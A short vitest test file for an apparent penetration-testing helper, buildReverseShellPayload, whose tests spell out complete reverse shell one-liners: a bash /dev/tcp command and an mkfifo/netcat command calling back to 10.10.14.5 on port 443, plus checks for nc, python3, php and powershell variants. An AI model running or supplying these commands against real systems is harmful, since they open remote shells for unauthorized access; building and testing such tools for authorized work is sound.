import { describe, expect, it } from "vitest";
import { buildReverseShellPayload } from "./reverseShellPayloads";

describe("buildReverseShellPayload", () => {
  it("builds the standard bash /dev/tcp one-liner", () => {
    expect(buildReverseShellPayload("bash", "10.10.14.5", "443"))
      .toBe("bash -i >& /dev/tcp/10.10.14.5/443 0>&1");
  });

  it("builds the mkfifo netcat one-liner for netcat builds without -e", () => {
    expect(buildReverseShellPayload("nc-mkfifo", "10.10.14.5", "443")).toBe(
      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 443 >/tmp/f",
    );
  });

  it("substitutes lhost/lport into every payload kind", () => {
    for (const kind of ["nc-e", "python3", "php", "powershell"] as const) {
      const payload = buildReverseShellPayload(kind, "10.10.14.5", "9001");
      expect(payload).toContain("10.10.14.5");
      expect(payload).toContain("9001");
    }
  });
});
